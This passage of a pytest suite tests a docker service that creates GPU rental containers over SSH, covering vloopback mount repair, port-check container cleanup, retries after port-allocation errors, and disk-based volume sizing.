async def test_repair_stale_vloopback_mountpoint_refuses_non_vloopback_driver(docker_service):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(stdout="local /mnt/volume_test\n"),
        ]
    )

    repaired = await docker_service.repair_stale_vloopback_mountpoint(
        ssh_client=ssh_client,
        local_volume="volume_test",
        default_extra={},
    )

    assert repaired is False
    ssh_client.run.assert_awaited_once()


@pytest.mark.asyncio
async def test_repair_stale_vloopback_mountpoint_refuses_unexpected_mountpoint(docker_service):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(stdout="vloopback:latest /tmp/volume_test\n"),
        ]
    )

    repaired = await docker_service.repair_stale_vloopback_mountpoint(
        ssh_client=ssh_client,
        local_volume="volume_test",
        default_extra={},
    )

    assert repaired is False
    ssh_client.run.assert_awaited_once()


@pytest.mark.asyncio
async def test_repair_stale_vloopback_mountpoint_refuses_non_empty_target(docker_service):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(stdout="vloopback:latest /mnt/volume_test\n"),
            _make_ssh_command_result(stdout="plugin123\n"),
            _make_ssh_command_result(exit_status=1),
            _make_ssh_command_result(exit_status=12, stderr="not empty"),
        ]
    )

    repaired = await docker_service.repair_stale_vloopback_mountpoint(
        ssh_client=ssh_client,
        local_volume="volume_test",
        default_extra={},
    )

    assert repaired is False


@pytest.mark.asyncio
async def test_wait_for_port_check_filter_includes_health_check(docker_service):
    """wait_for_port_check_containers must OR-filter container_{hotkey}_* AND health_check_*.

    DAH-1991: backend-created health_check_* probes (hotkey-agnostic) compete
    for the same port range as user rentals. Without this filter, the wait
    guard would proceed while a probe holds port 9101, causing `docker run` to
    fail with "port is already allocated".
    """
    from unittest.mock import patch

    seen_commands: list[str] = []

    class FakeSSHClient:
        async def run(self, cmd):
            seen_commands.append(cmd)
            return MagicMock(stdout="", stderr="", exit_status=0)

    class FakeConnect:
        async def __aenter__(self_inner):
            return FakeSSHClient()

        async def __aexit__(self_inner, *_):
            return None

    # Mock asyncssh.connect to return our fake client and bypass pkey decoding
    with patch("services.docker_service.asyncssh.connect", return_value=FakeConnect()), \
         patch("services.docker_service.asyncssh.import_private_key", return_value=MagicMock()):
        docker_service.ssh_service.decrypt_payload = Mock(return_value="---BEGIN---\n---END---")
        executor_info = ExecutorSSHInfo(
            uuid=str(uuid4()),
            address="127.0.0.1",
            port=10001,
            ssh_username="root",
            ssh_port=2201,
            python_path="/usr/bin/python",
            root_dir="/root",
            port_range="9100-9130",
            port_mappings=None,
            price_per_gpu=0.17,
            ssh_host_key=None,
            tdx_quote=None,
        )
        keypair_mock = MagicMock()
        keypair_mock.ss58_address = "5Test"

        ok, msg = await docker_service.wait_for_port_check_containers(
            executor_info=executor_info,
            miner_hotkey="5TestMiner",
            keypair=keypair_mock,
            private_key="encrypted-private-key",
            max_retries=0,
        )

    assert ok is True
    assert msg == "No port check containers found"
    # Inspect the docker ps command
    ps_cmd = next((c for c in seen_commands if "docker ps" in c), "")
    assert ps_cmd, f"No docker ps command issued. Commands seen: {seen_commands}"
    # Both filters must be present
    assert "name=^container_5TestMiner_" in ps_cmd
    assert "name=^health_check_" in ps_cmd


@pytest.mark.asyncio
async def test_wait_for_port_check_does_not_block_other_miner(docker_service):
    """A container_<other_hotkey>_* container on a shared host does NOT block us.

    Regression guard for Scenario 3 in the DAH-1991 pre-mortem: the hotkey
    scope on `container_*` must be preserved; adding health_check_* must NOT
    accidentally collapse the cross-miner isolation.
    """
    from unittest.mock import patch

    class FakeSSHClient:
        def __init__(self, stdout):
            self._stdout = stdout

        async def run(self, cmd):
            # Return empty — neither our prefix nor health_check_ matches
            return MagicMock(stdout="", stderr="", exit_status=0)

    class FakeConnect:
        async def __aenter__(self_inner):
            # stdout empty means nothing matches; simulating OTHER-miner container is
            # invisible under filter name=^container_{our_hotkey}_
            return FakeSSHClient(stdout="")

        async def __aexit__(self_inner, *_):
            return None

    with patch("services.docker_service.asyncssh.connect", return_value=FakeConnect()), \
         patch("services.docker_service.asyncssh.import_private_key", return_value=MagicMock()):
        docker_service.ssh_service.decrypt_payload = Mock(return_value="x")
        executor_info = ExecutorSSHInfo(
            uuid=str(uuid4()),
            address="127.0.0.1",
            port=10001,
            ssh_username="root",
            ssh_port=2201,
            python_path="/usr/bin/python",
            root_dir="/root",
            port_range="9100-9130",
            port_mappings=None,
            price_per_gpu=0.17,
            ssh_host_key=None,
            tdx_quote=None,
        )
        keypair_mock = MagicMock()
        keypair_mock.ss58_address = "5Test"

        ok, msg = await docker_service.wait_for_port_check_containers(
            executor_info=executor_info,
            miner_hotkey="5OurHotkey",
            keypair=keypair_mock,
            private_key="x",
            max_retries=0,
        )

    assert ok is True
    assert msg == "No port check containers found"


# ---------------------------------------------------------------------------
# DAH-2018: container-name conflict — between port-allocated retries we
# `docker rm -f <container_name>` to release the name Docker reserved during
# the prior `docker run` parse. Cleanup runs AFTER the backoff sleep so the
# rm→run window stays tight; cleanup failures warn-log but never abort.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_container_removes_stale_container_between_port_retries(
    docker_service, monkeypatch,
):
    """Between port-allocated retries: sleep first, then docker rm -f, then re-run.

    Pins both the rm command itself and the ordering vs the backoff sleep, so
    the rm→run window stays as tight as possible.
    """
    events: list[tuple] = []
    calls = {"n": 0}

    async def fake_execute(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        calls["n"] += 1
        events.append(("execute", calls["n"]))
        if calls["n"] == 1:
            raise Exception(_PORT_ALLOCATED_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fake_execute)

    async def fake_sleep(s):
        events.append(("sleep", s))

    monkeypatch.setattr("services.docker_service.asyncio.sleep", fake_sleep)

    ssh_client = Mock()

    async def fake_ssh_run(cmd):
        events.append(("ssh_run", cmd))
        return Mock(exit_status=0, stdout="", stderr="")

    ssh_client.run = fake_ssh_run

    await docker_service._run_docker_create_with_port_retry(
        ssh_client=ssh_client,
        command="/usr/bin/docker run -d -p 9101:9101 --name pod_test img",
        container_name="pod_test",
        log_tag="t",
        default_extra={},
        timeout=120,
    )

    assert calls["n"] == 2
    assert events == [
        ("execute", 1),
        ("sleep", 5),
        ("ssh_run", "/usr/bin/docker rm -f pod_test"),
        ("execute", 2),
    ]


@pytest.mark.asyncio
async def test_port_retry_continues_when_rm_cleanup_fails(
    docker_service, monkeypatch,
):
    """A failing `docker rm -f` must warning-log but not abort the retry loop."""
    calls = {"n": 0}

    async def fake_execute(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        calls["n"] += 1
        if calls["n"] == 1:
            raise Exception(_PORT_ALLOCATED_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fake_execute)

    async def fake_sleep(s):
        pass

    monkeypatch.setattr("services.docker_service.asyncio.sleep", fake_sleep)

    rm_calls: list[str] = []
    ssh_client = Mock()

    async def fake_ssh_run(cmd):
        # Raise only on docker rm to avoid masking unrelated future ssh calls.
        if "docker rm" in cmd:
            rm_calls.append(cmd)
            raise Exception("rm failed")
        return Mock(exit_status=0, stdout="", stderr="")

    ssh_client.run = fake_ssh_run

    warning_msgs: list[str] = []

    def capture_warning(msg, *args, **kwargs):
        warning_msgs.append(str(msg))

    monkeypatch.setattr("services.docker_service.logger.warning", capture_warning)

    # Should NOT raise — second attempt succeeds after the rm failure.
    await docker_service._run_docker_create_with_port_retry(
        ssh_client=ssh_client,
        command="/usr/bin/docker run -d -p 9101:9101 --name pod_test img",
        container_name="pod_test",
        log_tag="t",
        default_extra={},
        timeout=120,
    )

    assert calls["n"] == 2
    # rm was attempted exactly once (between the two execute attempts).
    assert rm_calls == ["/usr/bin/docker rm -f pod_test"]
    # And the failure was warning-logged with the documented tag.
    assert any("PORT_RETRY_STALE_RM_FAILED" in m for m in warning_msgs)


@pytest.mark.asyncio
async def test_other_docker_errors_skip_rm_cleanup(
    docker_service, monkeypatch,
):
    """Non-port-allocated errors must propagate immediately and never trigger rm."""
    async def fail_other(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        raise Exception("docker: Error response from daemon: No such image: bogus:latest")

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fail_other)

    ssh_client = Mock()
    ssh_client.run = AsyncMock()

    with pytest.raises(Exception, match="No such image"):
        await docker_service._run_docker_create_with_port_retry(
            ssh_client=ssh_client,
            command="/usr/bin/docker run -d --name pod_test bogus:latest",
            container_name="pod_test",
            log_tag="t",
            default_extra={},
            timeout=120,
        )

    # Non-port-allocated path must NOT issue any rm.
    ssh_client.run.assert_not_called()


# ---------------------------------------------------------------------------
# DAH-2018: late re-check of port_check containers right before `docker run`
# (after the image pull) reuses the open ssh_client instead of dialing again.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_wait_for_port_check_reuses_provided_ssh_client(docker_service):
    """When ssh_client is passed, the wait must reuse it — no asyncssh.connect.

    The early call in miner_service runs before image pull; the late call
    inside create_container runs after image pull, on the already-open
    rental session. Opening a second SSH connection here would be wasteful
    and would widen the TOCTOU gap. The function must skip both
    decrypt_payload and asyncssh.connect when ssh_client is supplied.
    """
    from unittest.mock import patch

    seen_commands: list[str] = []

    class FakeSSHClient:
        async def run(self, cmd):
            seen_commands.append(cmd)
            return MagicMock(stdout="", stderr="", exit_status=0)

    ssh_client = FakeSSHClient()

    decrypt_called = {"n": 0}
    docker_service.ssh_service.decrypt_payload = Mock(
        side_effect=lambda *a, **k: (_inc(decrypt_called) or "x")
    )

    with patch("services.docker_service.asyncssh.connect") as connect_mock, \
         patch("services.docker_service.asyncssh.import_private_key") as pkey_mock:
        ok, msg = await docker_service.wait_for_port_check_containers(
            executor_info=MagicMock(),
            miner_hotkey="5TestMiner",
            keypair=MagicMock(),
            private_key="ignored",
            max_retries=0,
            ssh_client=ssh_client,
        )

    assert ok is True
    assert msg == "No port check containers found"
    # The reused-session path must skip the connect dance entirely.
    connect_mock.assert_not_called()
    pkey_mock.assert_not_called()
    assert decrypt_called["n"] == 0
    # And the docker ps probe must still run on the supplied client.
    assert any("docker ps" in c for c in seen_commands)


def _inc(d):
    d["n"] += 1


@pytest.mark.asyncio
async def test_wait_for_port_check_late_call_force_cleans_stale_health_check(
    docker_service,
):
    """If a health_check_* probe is still up at the late re-check, force-clean it.

    Reproduces the May-1 incident: backend HC bound the same host port the
    rental allocated, image pull (~3min) elapsed, and the early wait result
    was stale by `docker run` time. The late call (max_retries=1) must
    detect the lingering health_check_* container and force-remove it
    before the rental's docker run.
    """
    calls = {"n": 0}

    class FakeSSHClient:
        seen: list[str] = []

        async def run(self_inner, cmd):
            FakeSSHClient.seen.append(cmd)
            calls["n"] += 1
            # First docker ps reports an HC still alive; second (after wait)
            # also reports it (so the loop exhausts retries and force-cleans).
            if "docker ps --format" in cmd:
                return MagicMock(
                    stdout="health_check_1777635787\n",
                    stderr="", exit_status=0,
                )
            # The xargs force-rm command — return success.
            return MagicMock(stdout="", stderr="", exit_status=0)

    async def instant_sleep(_):
        return None

    import services.docker_service as svc_mod
    real_sleep = svc_mod.asyncio.sleep
    svc_mod.asyncio.sleep = instant_sleep
    try:
        ok, msg = await docker_service.wait_for_port_check_containers(
            executor_info=MagicMock(),
            miner_hotkey="5TestMiner",
            keypair=MagicMock(),
            private_key="ignored",
            max_retries=1,
            retry_delay=30,
            ssh_client=FakeSSHClient(),
        )
    finally:
        svc_mod.asyncio.sleep = real_sleep

    assert ok is True
    assert "forcefully removed" in msg
    # Must have issued the force-rm xargs command targeting both prefixes.
    assert any(
        "docker rm -f" in c and "health_check_" in c and "container_5TestMiner_" in c
        for c in FakeSSHClient.seen
    ), f"force-rm xargs missing. Seen: {FakeSSHClient.seen}"


# ---------------------------------------------------------------------------
# DAH-2183: validator-side fresh vloopback sizing
# ---------------------------------------------------------------------------

_SIZING_GB = 1024 ** 3


def _make_sizing_payload(**overrides) -> ContainerCreateRequest:
    defaults = dict(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        docker_image="daturaai/pytorch:test",
        user_public_keys=["ssh-ed25519 test-key"],
        gpu_uuids=["GPU-test"],
    )
    defaults.update(overrides)
    return ContainerCreateRequest(**defaults)


def _make_sizing_ssh_client(
    df_avail_bytes: int,
    volume_ls_stdout: str = "",
    volume_inspect_stdout: str = "",
    df_error: bool = False,
) -> Mock:
    def run(command, **kwargs):
        if "docker info" in command:
            return Mock(stdout="/var/lib/docker\n", exit_status=0)
        if "df -P -B1 /hostfs" in command:
            if df_error:
                raise Exception("df boom")
            return Mock(
                stdout=(
                    "Filesystem           1-blocks       Used Available Capacity Mounted on\n"
                    f"/dev/vda1            1000 500 {df_avail_bytes}  80% /hostfs\n"
                ),
                exit_status=0,
            )
        if "volume ls" in command:
            return Mock(stdout=volume_ls_stdout, exit_status=0)
        if "volume inspect" in command:
            return Mock(stdout=volume_inspect_stdout, exit_status=0)
        raise AssertionError(f"unexpected ssh command: {command}")

    ssh_client = Mock()
    ssh_client.run = AsyncMock(side_effect=run)
    return ssh_client


@pytest.mark.asyncio
async def test_get_fs_available_bytes_happy_parse(docker_service):
    # Arrange: df runs via helper container; POSIX -P output, Available = 4th column.
    ssh_client = Mock()
    ssh_client.run = AsyncMock(
        return_value=Mock(
            stdout=(
                "Filesystem           1-blocks       Used Available Capacity Mounted on\n"
                "/dev/vda1            103865303040 83581857792 20266668032  80% /hostfs\n"
            ),
            exit_status=0,
        )
    )

    # Act
    avail = await docker_service._get_fs_available_bytes(ssh_client, "/var/lib/docker")

    # Assert
    assert avail == 20266668032
    command = ssh_client.run.call_args.args[0]
    assert command == (
        "/usr/bin/docker run --rm -v /var/lib/docker:/hostfs:ro "
        "docker.io/library/alpine:3.19 df -P -B1 /hostfs"
    )


@pytest.mark.asyncio
async def test_get_fs_available_bytes_nonzero_exit_raises(docker_service):
    # Arrange
    ssh_client = Mock()
    ssh_client.run = AsyncMock(
        return_value=Mock(stdout="", stderr="docker: boom", exit_status=125)
    )

    # Act / Assert
    with pytest.raises(Exception, match="docker: boom"):
        await docker_service._get_fs_available_bytes(ssh_client, "/var/lib/docker")


@pytest.mark.asyncio
async def test_get_fs_available_bytes_garbage_output_raises(docker_service):
    # Arrange: data line lacks a numeric 4th column.
    ssh_client = Mock()
    ssh_client.run = AsyncMock(
        return_value=Mock(stdout="Filesystem\ngarbage line\n", exit_status=0)
    )

    # Act / Assert
    with pytest.raises(Exception, match="Unexpected df output"):
        await docker_service._get_fs_available_bytes(ssh_client, "/var/lib/docker")


@pytest.mark.asyncio
async def test_get_fs_available_bytes_short_output_raises(docker_service):
    # Arrange: only the header line, no data line.
    ssh_client = Mock()
    ssh_client.run = AsyncMock(return_value=Mock(stdout="Filesystem\n", exit_status=0))

    # Act / Assert
    with pytest.raises(Exception, match="Unexpected df output"):
        await docker_service._get_fs_available_bytes(ssh_client, "/var/lib/docker")


@pytest.mark.asyncio
async def test_resolve_volume_sizing_legacy_passthrough(docker_service):
    # Arrange
    payload = _make_sizing_payload(volume_limit_gb=40, storage_limit_gb=20)
    ssh_client = Mock()
    ssh_client.run = AsyncMock()

    # Act
    result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "legacy"
    assert result.volume_limit_gb == 40
    assert result.storage_limit_gb == 20
    assert result.capped_by is None
    ssh_client.run.assert_not_called()


@pytest.mark.asyncio
async def test_resolve_volume_sizing_fresh_pool_bound(docker_service):
    # Arrange: df_avail=900GB, existing volumes=300GB, overhead 20 -> pool 1180GB,
    # disk_share 0.5 -> slice 590GB -> volume 393GB, storage 196GB.
    payload = _make_sizing_payload(disk_share=0.5)
    ssh_client = _make_sizing_ssh_client(
        df_avail_bytes=900 * _SIZING_GB,
        volume_ls_stdout="volume_abc vloopback:latest\nother_volume local\n",
        volume_inspect_stdout=f"{300 * _SIZING_GB}|<no value>\n",
    )

    # Act
    result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "fresh"
    assert result.capped_by == "pool"
    assert result.volume_limit_gb == 393
    assert result.storage_limit_gb == 196
    assert result.df_avail_bytes == 900 * _SIZING_GB
    assert result.existing_volumes_bytes == 300 * _SIZING_GB


@pytest.mark.asyncio
async def test_resolve_volume_sizing_fresh_request_cap_bound(docker_service):
    # Arrange: pool slice would be 590GB but request cap is 100GB * 1.5 = 150GB.
    payload = _make_sizing_payload(disk_share=0.5, volume_limit_gb=100, storage_limit_gb=50)
    ssh_client = _make_sizing_ssh_client(
        df_avail_bytes=900 * _SIZING_GB,
        volume_ls_stdout="volume_abc vloopback\n",
        volume_inspect_stdout=f"{300 * _SIZING_GB}|<no value>\n",
    )

    # Act
    result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "fresh"
    assert result.capped_by == "request_cap"
    assert result.volume_limit_gb == 100
    assert result.storage_limit_gb == 50


@pytest.mark.asyncio
async def test_resolve_volume_sizing_fresh_df_guard_bound(docker_service):
    # Arrange: df_avail=50GB, existing=1000GB, share=0.9 -> pool slice 927GB,
    # df guard (50-10)*1.5 = 60GB wins -> volume 40GB, storage 20GB.
    payload = _make_sizing_payload(disk_share=0.9)
    ssh_client = _make_sizing_ssh_client(
        df_avail_bytes=50 * _SIZING_GB,
        volume_ls_stdout="volume_abc vloopback\n",
        volume_inspect_stdout="<no value>|1000g\n",
    )

    # Act
    result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "fresh"
    assert result.capped_by == "df_guard"
    assert result.volume_limit_gb == 40
    assert result.storage_limit_gb == 20


@pytest.mark.asyncio
async def test_resolve_volume_sizing_below_min_raises(docker_service):
    # Arrange: df_avail=30GB, no volumes, share=0.5 -> pool 10GB, slice 5GB,
    # volume 3GB < min_volume_gb=10.
    payload = _make_sizing_payload(disk_share=0.5, min_volume_gb=10)
    ssh_client = _make_sizing_ssh_client(df_avail_bytes=30 * _SIZING_GB)

    # Act / Assert
    with pytest.raises(VolumeMinSizeError):
        await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})


@pytest.mark.asyncio
async def test_resolve_volume_sizing_severe_shrink_logged(docker_service):
    # Arrange: requested 1000GB, share=1.0, df_avail=100GB, no volumes ->
    # pool 80GB binds -> volume 53GB < 1000/2 -> severe shrink.
    payload = _make_sizing_payload(disk_share=1.0, volume_limit_gb=1000)
    ssh_client = _make_sizing_ssh_client(df_avail_bytes=100 * _SIZING_GB)

    # Act
    with patch("services.docker_service.logger") as mock_logger:
        result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "fresh"
    assert result.capped_by == "pool"
    assert result.volume_limit_gb == 53
    warning_keys = [call.args[0].message for call in mock_logger.warning.call_args_list]
    assert "vloopback_fresh_sizing_severe_shrink" in warning_keys


@pytest.mark.asyncio
async def test_resolve_volume_sizing_measurement_failure_falls_back(docker_service):
    # Arrange
    payload = _make_sizing_payload(disk_share=0.5, volume_limit_gb=40, storage_limit_gb=20)
    ssh_client = _make_sizing_ssh_client(df_avail_bytes=0, df_error=True)

    # Act
    with patch("services.docker_service.logger") as mock_logger:
        result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "fresh_fallback"
    assert result.volume_limit_gb == 40
    assert result.storage_limit_gb == 20
    warning_keys = [call.args[0].message for call in mock_logger.warning.call_args_list]
    assert "vloopback_fresh_sizing_fallback" in warning_keys


def test_parse_volume_size_to_bytes_handles_bytes_and_size_strings():
    # Arrange / Act / Assert
    assert _parse_volume_size_to_bytes("20401094656") == 20401094656
    assert _parse_volume_size_to_bytes("19g") == 19 * 1024 ** 3
    assert _parse_volume_size_to_bytes("1t") == 1024 ** 4
    assert _parse_volume_size_to_bytes("<no value>") is None
    assert _parse_volume_size_to_bytes("") is None
    assert _parse_volume_size_to_bytes(None) is None


@pytest.mark.asyncio
async def test_resolve_volume_sizing_low_free_space_clamps_to_floor(docker_service):
    # Arrange: df_avail=5GB is below both overhead (20GB) and headroom (10GB);
    # pool and df_guard candidates must clamp to 0, not go negative.
    payload = _make_sizing_payload(disk_share=1.0)
    ssh_client = _make_sizing_ssh_client(df_avail_bytes=5 * _SIZING_GB)

    # Act
    result = await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})

    # Assert
    assert result.path == "fresh"
    assert result.volume_limit_gb == 1
    assert result.storage_limit_gb == 1


@pytest.mark.asyncio
async def test_resolve_volume_sizing_low_free_space_below_min_raises(docker_service):
    # Arrange: same nearly-full disk, but a min floor is set -> reject.
    payload = _make_sizing_payload(disk_share=1.0, min_volume_gb=10)
    ssh_client = _make_sizing_ssh_client(df_avail_bytes=5 * _SIZING_GB)

    # Act / Assert
    with pytest.raises(VolumeMinSizeError):
        await docker_service.resolve_volume_sizing(ssh_client, payload, "tag", {})


@pytest.mark.asyncio
async def test_create_container_fresh_sizing_uses_effective_values(
    docker_service,
    monkeypatch,
):
    """disk_share set: effective fresh values (not payload echoes) must flow into
    create_local_volume, the docker run --storage-opt flag, and ContainerCreated."""
    # Arrange: df_avail=900GB, existing vloopback=300GB, share=0.5 -> pool 1180GB,
    # slice 590GB (request cap 500*1.5=750GB does not bind) -> volume 393, storage 196.
    def ssh_run(command, **kwargs):
        if "docker info" in command:
            return _make_ssh_command_result(stdout="/var/lib/docker\n")
        if "df -P -B1 /hostfs" in command:
            return _make_ssh_command_result(
                stdout=(
                    "Filesystem           1-blocks       Used Available Capacity Mounted on\n"
                    f"/dev/vda1            1000 500 {900 * _SIZING_GB}  80% /hostfs\n"
                )
            )
        if "volume ls" in command:
            return _make_ssh_command_result(stdout="volume_other vloopback\n")
        if "volume inspect" in command:
            return _make_ssh_command_result(stdout=f"{300 * _SIZING_GB}|<no value>\n")
        return _make_ssh_command_result()

    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(side_effect=ssh_run)
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock())
    monkeypatch.setattr("services.docker_service.build_gpu_flags", AsyncMock(return_value=""))

    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")
    docker_service.redis_service.add_pending_pod = AsyncMock()
    docker_service.redis_service.remove_pending_pod = AsyncMock()
    docker_service.redis_service.add_rented_pod = AsyncMock()
    monkeypatch.setattr(docker_service, "_prepare_known_hosts_policy", AsyncMock(return_value=None))
    monkeypatch.setattr(
        docker_service,
        "generate_portMappings",
        AsyncMock(return_value=([(22, 20001, 20001)], None)),
    )
    monkeypatch.setattr(docker_service, "execute_and_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_existing_containers", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_stale_vloopback_volumes", AsyncMock())
    monkeypatch.setattr(docker_service, "create_local_volume", AsyncMock())
    monkeypatch.setattr(
        docker_service,
        "wait_for_port_check_containers",
        AsyncMock(return_value=(True, "ok")),
    )
    monkeypatch.setattr(docker_service, "_run_docker_create_with_port_retry", AsyncMock())
    monkeypatch.setattr(docker_service, "check_container_running", AsyncMock(return_value=True))
    monkeypatch.setattr(docker_service, "install_open_ssh_server_and_start_ssh_service", AsyncMock())
    monkeypatch.setattr(docker_service, "stream_log", AsyncMock())
    monkeypatch.setattr(docker_service, "finish_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "handle_stream_logs", AsyncMock())

    payload = ContainerCreateRequest(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        docker_image="daturaai/pytorch:test",
        user_public_keys=["ssh-ed25519 test-key"],
        gpu_uuids=["GPU-test"],
        cpu_count=1,
        memory_gb=1,
        volume_limit_gb=500,
        storage_limit_gb=250,
        disk_share=0.5,
        available_ports=[PayloadPortMapping(internal_port=20001, external_port=20001)],
        pod_mapping=[],
        active_container_names=[],
        active_volume_names=[],
    )
    executor_info = ExecutorSSHInfo(
        uuid=payload.executor_id,
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python",
        root_dir="/root/app",
    )
    keypair = Mock(ss58_address="validator-hotkey")

    # Act
    result = await docker_service.create_container(
        payload=payload,
        executor_info=executor_info,
        keypair=keypair,
        private_key="encrypted",
    )

    # Assert: fresh-computed volume limit reaches docker volume create
    assert docker_service.create_local_volume.await_args.kwargs["limit"] == 393
    # Assert: fresh-computed storage limit reaches docker run --storage-opt
    run_command = docker_service._run_docker_create_with_port_retry.await_args.kwargs["command"]
    assert "--storage-opt size=196g" in run_command
    # Assert: ContainerCreated carries effective values, not payload echoes
    assert result.volume_limit_gb == 393
    assert result.storage_limit_gb == 196
